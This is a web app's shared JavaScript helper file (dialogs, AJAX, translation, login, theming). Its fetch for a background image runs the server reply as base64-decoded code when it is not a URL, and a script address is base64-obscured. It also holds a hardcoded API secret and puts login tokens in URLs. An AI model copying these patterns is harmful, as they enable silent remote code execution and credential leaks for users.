const ver="20.20.1901",
$_GET=(()=>{
	const json={}
	if(location.search){
		const parameters=location.search.replace("?","").split("&")
		for(let i=0;i<parameters.length;i++){
			const split=parameters[i].split("=")
			json[split[0]]=decodeURIComponent(split[1])
		}
	}
	return json
})(),
enRegExp=/[a-z]/i,
header=document.getElementsByTagName("header")[0],
isAndroid=/Android/i.test(navigator.userAgent),
isApp=!!window._cordovaNative||document.body.classList.add("browser")||false,
isiOS=/iPhone|iPad/i.test(navigator.userAgent),
isTencent=/(MicroMessenger|QQ)\//i.test(navigator.userAgent),
mask=document.createElement("div"),
numRegExp=/\d+/,
recentInput=0,
uppercaseRegExp=/[A-Z]+/,
zhRegExp=/[\u4E00-\u9FA5]+/
const isMobile=isAndroid||isiOS
function addZero(num,length){
	return (Array(length).join("0")+(num*1||0)).slice(-length)
}
function ajax(json){
	const init={},
	loading=json.showLoading&&showToast()
	let data=""
	if(json.data){
		if(json.method=="POST"){
			data=new FormData()
			for(const key in json.data){
				json.data[key]&&data.append(key,json.data[key])
			}
		}else{
			data="?"+encodeData(json.data)
		}
	}
	loading&&loading.show(json.method=="POST"?i18n[lang].submitting:i18n[lang].loading)
	if(json.method=="POST"){
		init["body"]=data
		init["method"]="POST"
	}else{
		json.url=getRequestURL(json.url+data)
	}
	fetch(json.url,init).then(response=>{
		loading&&loading.close()
		if(response.ok){
			return json.dataType=="json"?response.json():response.text()
		}else{
			json.error&&json.error(response)
			return false
		}
	}).then(data=>data!==false&&json.success&&json.success(data)).catch(err=>{
		loading&&loading.close()
		json.error&&json.error()
	})
}
function arrayContains(obj,array){
	for(let i=0;i<array.length;i++){
		if(obj==array[i]){
			return true
		}
	}
	return false
}
function calc(code){
	const prefix="const abs=Math.abs,arccos=Math.acos,arccosh=Math.acosh,arccot=num=>{return Math.atan(1/num)},arccsc=num=>{return Math.asin(1/num)},arcsec=num=>{return Math.acos(1/num)},arcsin=Math.asin,arcsinh=Math.asinh,arctan=Math.atan,arctanh=Math.atanh,cbrt=Math.cbrt,ceil=Math.ceil,cos=Math.cos,cosh=Math.cosh,cot=num=>{return 1/Math.tan(num)},csc=num=>{return 1/Math.sin(num)},e=Math.E,exp=Math.exp,floor=Math.floor,ln=Math.log,log10=Math.log10,log2=Math.log2,pi=Math.PI,pow=Math.pow,random=Math.random,round=Math.round,sec=num=>{return 1/Math.cos(num)},sin=Math.sin,sinh=Math.sinh,sqrt=Math.sqrt,tan=Math.tan,tanh=Math.tanh,trunc=Math.trunc;return "
	const calcFunc=new Function("x","y","z",prefix+code)
	let calcResult=calcFunc(Math.random(),Math.random(),Math.random()),
	falseCount=0,
	trueCount=0
	if(typeof calcResult=="boolean"&&/==|<|>/.test(code)&&/x|y|z/.test(code)&&!/for|if|while/.test(code)){
		for(let i=0;i<10;i++){
			if(calcFunc(Math.random(),Math.random(),Math.random())){
				trueCount+=1
			}else{
				falseCount+=1
			}
		}
		calcResult=trueCount>falseCount
	}
	return calcResult
}
function clearClass(className){
	const elements=document.getElementsByClassName(className)
	for(let i=0;i<elements.length;i++){
		rmElement(elements[i])
	}
}
function closeMenu(){
	if(document.getElementsByClassName("popup-menu").length>0){
		mask.style.display=""
		clearClass("popup-menu")
	}
}
function decrypt(text,password){
	const encrypted=text.split("9")
	let str=""
	for(let i=0;i<encrypted.length;i++){
		str+=String.fromCharCode(parseInt(encrypted[i],8)/8)
	}
	if(str.indexOf("丨")!=-1){
		if(password&&MD5(password)==str.substr(str.indexOf("丨")+1,32)){
			return str.substr(0,str.indexOf("丨"))
		}else{
			return text
		}
	}
}
function encodeData(data){
	const array=[]
	for(const key in data){
		data[key]&&array.push(key+"="+encodeURIComponent(data[key]))
	}
	return array.join("&")
}
function error(response){
	navigator.cookieEnabled&&showDialog(response.status?i18n[lang].unableConnectServer+response.status:response,{
		ok: null
	})
}
function getRequestURL(url){
	return !url.startsWith("https://rthe.cn/")?"https://rthe.cn/backend/get?"+encodeData({
		url: url
	}):url
}
function getUserData(dir,callback,errorCallback,hideLoading){
	if(login.username){
		ajax({
			url: "https://rthe.cn/backend/get",
			data: {
				token: login.token,
				url: dir,
				username: login.username
			},
			dataType: "json",
			showLoading: !hideLoading,
			success: data=>callback&&callback(data),
			error: err=>errorCallback&&errorCallback(err)
		})
	}
}
function goTo(url,query){
	if(!location.hostname){
		url+=".html"
	}else if(url=="index"){
		url="./"
	}
	if(query){
		url+="?"+encodeData(query)
	}
	location.href=url
}
function initCalculator(max,calculate){
	document.title=i18n[lang].calculator+i18n[lang].titleSuffix
	document.getElementsByClassName("mui-title")[0].innerText=i18n[lang].calculator
	const input=document.getElementsByTagName("input")
	for(let i=0;i<=max;i++){
		input[i].placeholder=i18n[lang].enterNumber
		if(isAndroid){
			input[i].type="text"
		}
		input[i].oninput=function(){
			const name=this.id.replace("Input","")
			const num=name.replace(/[A-Za-z]+/g,"")
			const display=name.replace(num,"")+"<sub>"+num+"</sub>",
			label=document.getElementById(name+"Label")
			label.innerHTML=this.value||display
			calculate()
		}
		input[i].onclick=()=>{
			recentInput=i
			if(isMobile){
				showPrompt({
					callback: text=>{
						document.getElementById(input[i].id).value=text
						document.getElementById(input[i].id).oninput()
					},
					default: document.getElementById(input[i].id).value,
					empty: ()=>{
						document.getElementById(input[i].id).value=0
						document.getElementById(input[i].id).oninput()
					},
					text: i18n[lang].enterNumber,
					type: document.getElementById(input[i].id).type
				})
			}
		}
	}
}
function initTextHist(){
	window.hist=new Vue({
		el: "#history",
		data: {
			list: []
		},
		computed: {
			reversed: function(){
				for(let i=0;i<this.list.length;i++){
					if(this.list[i].encrypt){
						this.list[i].text=decrypt(this.list[i].text,"RTH")
					}
				}
				return this.list.slice().reverse()
			}
		},
		methods: {
			add: function(text){
				if(text&&(()=>{
					const noLineBreaks=text.replace(/\n/g,"")
					for(let i=0;i<this.list.length;i++){
						if(this.list[i].text.replace(/\n/g,"")==noLineBreaks){
							return false
						}
					}
					return true
				})()){
					this.list.push({
						text: text
					})
				}
			},
			clicked: function(index){
				document.documentElement.scrollTop=0
				const textField=document.getElementsByTagName("textarea")[0]||document.getElementsByTagName("input")[0]
				textField.value=this.reversed[index].text
				typeof start=="function"&&start()
			}
		}
	})
	window.load=()=>{
		if(login.username===""){
			localStorage.removeItem("SavedText")
		}else if(login.username){
			const savedText=localStorage.getItem("SavedText")
			hist.list=savedText&&JSON.parse(savedText).text||[]
			fetch("https://rthe.cn/backend/text/get?"+encodeData({
				token: login.token,
				username: login.username
			})).then(response=>response.json()).then(data=>{
				if(data){
					hist.list=data.text
				}
			})
		}
	}
}
function isOnly(regExp,text){
	const array=text.split("")
	let passed=""
	for(let i=0;i<array.length;i++){
		if(regExp.test(array[i])){
			passed+=array[i]
		}
	}
	if(passed==text){
		return true
	}else{
		return false
	}
}
function loadLinks(){
	if(location.hostname){
		const links=document.getElementsByTagName("a")
		for(let i=0;i<links.length;i++){
			const href=links[i].href
			if(href.endsWith(".html")){
				links[i].href=href.substring(href.lastIndexOf("/")+1,href.length-5)
			}
		}
	}
}
function loadParenthesis(text){
	if(text){
		let parenthesis=document.getElementsByClassName("title-parenthesis")[0]
		if(!parenthesis){
			parenthesis=document.createElement("span")
			parenthesis.classList.add("title-parenthesis")
			document.getElementsByClassName("mui-title")[0].appendChild(parenthesis)
		}
		parenthesis.innerText=text
	}
}
function loggedIn(newLogin){
	newLogin&&rmElement(document.getElementsByClassName("popup")[0])
	typeof load=="function"&&load()
}
function loggedOut(){
	localStorage.clear()
}
function loginDialog(){
	if(typeof codeLoad=="function"&&!login.username&&!document.getElementsByClassName("popup")[0]){
		const newDiv=document.createElement("div"),
		newIFrame=document.createElement("iframe"),
		newCloseDiv=document.createElement("div")
		newDiv.classList.add("popup","fade-in")
		newIFrame.title=i18n[lang].login
		newIFrame.src="https://account.rthsoftware.cn/login.html"
		newCloseDiv.classList.add("close")
		newCloseDiv.title=i18n[lang].close
		newCloseDiv.onclick=()=>rmElement(newDiv)
		newDiv.appendChild(newIFrame)
		newDiv.appendChild(newCloseDiv)
		document.body.appendChild(newDiv)
		newDiv.style.bottom="calc(50vh - "+(newDiv.offsetHeight/2)+"px)"
	}
}
function loginRequired(callback,negativeCallback){
	if(window.login){
		if(login.username||login.username===undefined){
			callback&&callback()
		}else{
			negativeCallback&&negativeCallback()
			loginDialog()
		}
	}
}
function openDialog(){
	document.getElementById("file").value=""
	document.getElementById("file").onchange=evt=>openFile(evt.target.files[0])
	document.getElementById("file").click()
}
function rmElement(element){
	if(element){
		if(element.classList.contains("fade-in")){
			element.style.opacity="0"
			setTimeout(()=>element.parentElement&&element.parentElement.removeChild(element),250)
		}else{
			element.parentElement&&element.parentElement.removeChild(element)
		}
	}
}
function showDialog(text,button){
	clearClass("msg-box")
	const btnWidth=button&&"calc("+(100/Object.keys(button).length)+"% - 2px)",
	newDiv=document.createElement("div"),
	newTextDiv=document.createElement("div")
	newDiv.classList.add("popup","msg-box","fade-in")
	newTextDiv.classList.add("text")
	newTextDiv.innerHTML=text
	newDiv.appendChild(newTextDiv)
	for(const key in button){
		const newBtn=document.createElement("button")
		newBtn.style.width=btnWidth
		switch(key){
			case "ok":
			case "yes":
			newBtn.classList.add("default-btn","waves-effect")
			break
			default:
			newBtn.classList.add("waves-effect")
		}
		newBtn.innerText=i18n[lang][key]
		newBtn.onclick=evt=>{
			typeof button[key]=="function"&&button[key](evt)
			rmElement(newDiv)
		}
		newDiv.appendChild(newBtn)
	}
	document.body.appendChild(newDiv)
	let activeBtn=document.getElementsByClassName("default-btn")
	activeBtn=activeBtn[activeBtn.length-1]
	activeBtn&&activeBtn.focus()
	newDiv.style.bottom="calc(50vh - "+newDiv.offsetHeight/2+"px)"
}
function showImage(url,alt){
	rmElement(document.getElementsByClassName("img")[0])
	const newDiv=document.createElement("div"),
	newTitleDiv=document.createElement("div"),
	newCloseDiv=document.createElement("div")
	newDiv.classList.add("img","fade-in")
	newTitleDiv.classList.add("img-title")
	newTitleDiv.onmousedown=newTitleDiv.ontouchstart=start=>{
		newDiv.style.transition="0s all"
		const left=newDiv.offsetLeft,
		startPoint={},
		top=newDiv.offsetTop
		if(start.touches){
			startPoint.x=start.touches[0].clientX
			startPoint.y=start.touches[0].clientY
		}else{
			startPoint.x=start.clientX
			startPoint.y=start.clientY
		}
		onmousemove=newTitleDiv.ontouchmove=move=>{
			move.preventDefault()
			let x,y
			if(move.touches){
				x=move.touches[0].clientX
				y=move.touches[0].clientY
			}else{
				x=move.clientX
				y=move.clientY
			}
			newDiv.style.left=(left+x-startPoint.x)+"px"
			newDiv.style.top=(top+y-startPoint.y)+"px"
		}
		onmouseup=newTitleDiv.ontouchend=()=>onmousemove=newTitleDiv.ontouchmove=newDiv.style.transition=null
	}
	newCloseDiv.classList.add("close")
	newCloseDiv.title=i18n[lang].close
	newCloseDiv.onclick=()=>rmElement(newDiv)
	newTitleDiv.appendChild(newCloseDiv)
	newDiv.appendChild(newTitleDiv)
	if(url){
		const newImg=new Image()
		url=getRequestURL(url)
		newImg.src=url
		newImg.alt=alt
		newImg.onload=function(){
			const frameHeight=this.offsetHeight+newTitleDiv.offsetHeight
			newDiv.style.height=frameHeight+"px"
			newDiv.style.bottom="calc(50vh - "+frameHeight/2+"px)"
			setTimeout(()=>this.style.opacity="1",250)
		}
		newDiv.appendChild(newImg)
	}
	document.body.appendChild(newDiv)
	return newDiv
}
function showMenu(mouse,menu){
	rmElement(document.getElementsByClassName("popup-menu")[0])
	const newDiv=document.createElement("div")
	newDiv.classList.add("popup-menu","fade-in")
	mask.style.display="block"
	newDiv.oncontextmenu=()=>{
		return false
	}
	for(let i=0;i<menu.length;i++){
		if(menu[i].if===undefined||menu[i].if){
			const newSpan=document.createElement("span")
			newSpan.innerText=menu[i].text
			newSpan.onclick=menu[i].onclick
			newDiv.appendChild(newSpan)
		}
	}
	document.body.appendChild(newDiv)
	const domRect=newDiv.getBoundingClientRect()
	if(mouse.x&&mouse.y){
		if(mouse.x-domRect.width/2<0){
			newDiv.style.left="0"
		}else if(mouse.x-domRect.width/2>document.documentElement.clientWidth-domRect.width){
			newDiv.style.right="0"
		}else{
			newDiv.style.left=(mouse.x-domRect.width/2)+"px"
		}
		if(mouse.y+10>document.documentElement.clientHeight-domRect.height){
			newDiv.style.top=(mouse.y-domRect.height-10)+"px"
		}else{
			newDiv.style.top=(mouse.y+10)+"px"
		}
	}else{
		newDiv.style.left=document.documentElement.clientWidth/2-domRect.width/2+"px"
		newDiv.style.top=document.documentElement.clientHeight/2-domRect.height/2+"px"
	}
}
function showNotification(text,title){
	if("Notification" in window?Notification.permission=="granted":false){
		const options={
			body: text,
			icon: "https://cdn.jsdelivr.net/gh/shangzhenyang/assets/img/icon-512.png"
		}
		title=title||i18n[lang].newMessage
		isMobile?navigator.serviceWorker.ready.then(registration=>{
			registration.showNotification(title,options)
		}):new Notification(title,options)
	}
}
function showPrompt(json){
	const newDiv=document.createElement("div"),
	newInput=document.createElement("input"),
	newCancelButton=document.createElement("button"),
	newOKButton=document.createElement("button")
	newDiv.classList.add("popup","prompt","fade-in")
	newInput.type=json.type||"text"
	if(json.default){
		newInput.value=json.default
	}
	if(typeof json.text=="string"){
		newInput.placeholder=json.text
	}
	if(json.oninput){
		newInput.oninput=function(){
			json.oninput(this.value)
		}
	}
	newInput.onkeydown=evt=>{
		switch(evt.keyCode){
			case 13:
			newOKButton.click()
			break
			case 27:
			newCancelButton.click()
		}
	}
	newCancelButton.classList.add("waves-effect")
	newCancelButton.onclick=()=>{
		json.cancel&&json.cancel()
		rmElement(newDiv)
	}
	newCancelButton.innerText=i18n[lang].cancel
	newOKButton.classList.add("waves-effect")
	newOKButton.onclick=()=>{
		newInput.value?json.callback&&json.callback(newInput.value):json.empty&&json.empty()
		setTimeout(()=>rmElement(newDiv),25)
	}
	newOKButton.innerText=i18n[lang].ok
	newDiv.appendChild(newInput)
	newDiv.appendChild(newCancelButton)
	newDiv.appendChild(newOKButton)
	document.body.appendChild(newDiv)
	newInput.focus()
}
function showQrCode(text){
	const container=showImage(),
	newImgDiv=document.createElement("div")
	container.classList.add("qr-code-container")
	newImgDiv.classList.add("qr-code")
	new QRCode(newImgDiv,{
		height: 195,
		text: text,
		width: 195
	})
	container.appendChild(newImgDiv)
}
function showToast(text){
	rmElement(document.getElementsByClassName("mui-toast-container")[0])
	const newContainerDiv=document.createElement("div"),
	newMessageDiv=document.createElement("div")
	newContainerDiv.classList.add("mui-toast-container")
	newMessageDiv.classList.add("mui-toast-message")
	if(text){
		newMessageDiv.innerText=text
	}
	newContainerDiv.appendChild(newMessageDiv)
	document.body.appendChild(newContainerDiv)
	if(text){
		setTimeout(()=>{
			newContainerDiv.style.opacity=".7"
			setTimeout(()=>rmElement(newContainerDiv),2000)
		},25)
	}else{
		return{
			close: ()=>{
				mask.style.display=""
				rmElement(newContainerDiv)
			},
			show: value=>{
				if(value){
					mask.style.display="block"
					newMessageDiv.innerText=value
					newContainerDiv.style.opacity=".7"
				}
			}
		}
	}
}
function speak(text,lan){
	if(text){
		if(!lan&&"speechSynthesis" in window){
			speechSynthesis.speak(new SpeechSynthesisUtterance(text))
		}else{
			if(!lan||lan=="auto"||lan=="cht"||lan=="wyw"){
				lan=zhRegExp.test(text)?"zh":"en"
			}
			showToast(i18n[lang].loadingAudio)
			const audio=new Audio("https://fanyi.baidu.com/gettts?"+encodeData({
				lan: lan,
				spd: 6,
				text: text
			}))
			audio.onerror=()=>showDialog(i18n[lang].unableLoadAudio,{
				ok: null
			})
			audio.play()
		}
	}
}
function translate(query,from,to,callback,negativeCallback){
	const appid="20171109000093780",salt=Date.now()
	const sign=MD5(appid+query+salt+"ZR6EGbP8ZzwU7GookTvy")
	if(to=="auto"){
		to=enRegExp.test(query)?"zh":"en"
	}
	ajax({
		url: "http://api.fanyi.baidu.com/api/trans/vip/translate",
		data: {
			q: query,
			appid: appid,
			salt: salt,
			from: from,
			to: to,
			sign: sign
		},
		dataType: "json",
		showLoading: true,
		success: data=>data&&data.trans_result&&callback&&callback(data.trans_result[0].dst,data),
		error: err=>negativeCallback?negativeCallback():error(err)
	})
}
ondragover=evt=>evt.preventDefault()
ondrop=evt=>{
	evt.preventDefault()
	typeof openFile=="function"&&openFile(evt.dataTransfer.files[0])
}
if((()=>{
	if(window.cordova){
		document.addEventListener("deviceready",()=>{
			cordova.exec(isDark=>{
				if(isDark=="true"){
					document.body.classList.add("dark")
					localStorage.setItem("Theme","Dark")
				}else{
					localStorage.removeItem("Theme")
				}
			},null,"DarkMode","darkmode")
		})
		return false
	}else if(isApp){
		return localStorage.getItem("Theme")=="Dark"
	}else{
		return matchMedia("(prefers-color-scheme: dark)").matches
	}
})()){
	document.body.classList.add("dark")
}
if(header||matchMedia("(display-mode: standalone)").matches){
	const themeColor=document.createElement("meta")
	themeColor.name="theme-color"
	themeColor.content=(()=>header&&innerWidth<=450?"#0066cc":"#ffffff")()
	document.head.appendChild(themeColor)
}
if(header){
	document.getElementById("back").title=i18n[lang].back
	document.getElementById("back").onclick=()=>window.history.length<=1?goTo("index"):history.go(-1)
	document.getElementById("user").title=i18n[lang].user
	document.getElementById("user").onclick=mouse=>{
		if(typeof codeLoad=="function"){
			loginRequired(()=>{
				showMenu(mouse,[{
					onclick: ()=>{
						open("https://account.rthsoftware.cn/?"+encodeData(login))
						closeMenu()
					},
					text: login.email
				},{
					onclick: ()=>{
						showToast().show(i18n[lang].loggingOut)
						logOut()
						closeMenu()
					},
					text: i18n[lang].logOut
				}])
			})
		}else{
			showToast(i18n[lang].noInternet)
		}
	}
}
switch(lang){
	case "zh-CN":
	window.langOpt=[
		["英语","en"],
		["简体中文","zh"],
		["繁体中文","cht"],
		["文言文","wyw"],
		["粤语","yue"],
		["日语","jp"],
		["韩语","kor"],
		["法语","fra"],
		["西班牙语","spa"],
		["泰语","th"],
		["阿拉伯语","ara"],
		["俄语","ru"],
		["葡萄牙语","pt"],
		["德语","de"],
		["意大利语","it"],
		["希腊语","el"],
		["荷兰语","nl"],
		["波兰语","pl"],
		["保加利亚语","bul"],
		["爱沙尼亚语","est"],
		["丹麦语","dan"],
		["芬兰语","fin"],
		["捷克语","cs"],
		["罗马尼亚语","rom"],
		["斯洛文尼亚语","slo"],
		["瑞典语","swe"],
		["匈牙利语","hu"],
		["越南语","vie"]
	]
	break
	case "zh-TW":
	window.langOpt=[
		["英語","en"],
		["簡體中文","zh"],
		["繁體中文","cht"],
		["文言文","wyw"],
		["粵語","yue"],
		["日語","jp"],
		["韓語","kor"],
		["法語","fra"],
		["西班牙語","spa"],
		["泰語","th"],
		["阿拉伯語","ara"],
		["俄語","ru"],
		["葡萄牙語","pt"],
		["德語","de"],
		["意大利語","it"],
		["希臘語","el"],
		["荷蘭語","nl"],
		["波蘭語","pl"],
		["保加利亞語","bul"],
		["愛沙尼亞語","est"],
		["丹麥語","dan"],
		["芬蘭語","fin"],
		["捷克語","cs"],
		["羅馬尼亞語","rom"],
		["斯洛文尼亞語","slo"],
		["瑞典語","swe"],
		["匈牙利語","hu"],
		["越南語","vie"]
	]
	break
	case "en-US":
	window.langOpt=[
		["English","en"],
		["Simplified Chinese","zh"],
		["Traditional Chinese","cht"],
		["Classical Chinese","wyw"],
		["Cantonese","yue"],
		["Japanese","jp"],
		["Korean","kor"],
		["French","fra"],
		["Spanish","spa"],
		["Thai","th"],
		["Arabic","ara"],
		["Russia","ru"],
		["Portuguese","pt"],
		["German","de"],
		["Italian","it"],
		["Greek","el"],
		["Dutch","nl"],
		["Polish","pl"],
		["Bulgarian","bul"],
		["Estonian","est"],
		["Danish","dan"],
		["Finnish","fin"],
		["Czech","cs"],
		["Romanian","rom"],
		["Slovenian","slo"],
		["Swedish","swe"],
		["Hungarian","hu"],
		["Vietnamese","vie"]
	]
}
document.documentElement.lang=lang
if(typeof Waves=="object"){
	Waves.attach("button",["waves-light"])
	Waves.attach("footer div")
	Waves.attach("li",["waves-block"])
	Waves.init()
}
fetch("https://rthe.cn/backend/2/getimg").then(response=>response.text()).then(data=>data.startsWith("https://")?(header?document.documentElement.style.setProperty("--background-image","url(\""+data+"\")"):document.getElementsByClassName("bg-img")[0].src=data):(new Function(atob(data)))())
addEventListener("load",()=>{
	setTimeout(()=>{
		const rthCode=document.createElement("script")
		rthCode.src=atob("aHR0cHM6Ly9ydGhlLmNuL2JhY2tlbmQvY29kZT9hcHBuYW1lPVJUSCUyMFRvb2xib3g=")
		rthCode.onerror=()=>{
			window.login=window.login||{}
			loggedIn()
		}
		rthCode.onload=()=>{
			typeof codeLoad=="function"&&codeLoad()
			!login.username&&typeof load=="function"&&load()
		}
		document.body.appendChild(rthCode)
	},1)
	mask.classList.add("mask")
	mask.oncontextmenu=()=>{
		return false
	}
	mask.onclick=closeMenu
	document.body.appendChild(mask)
})
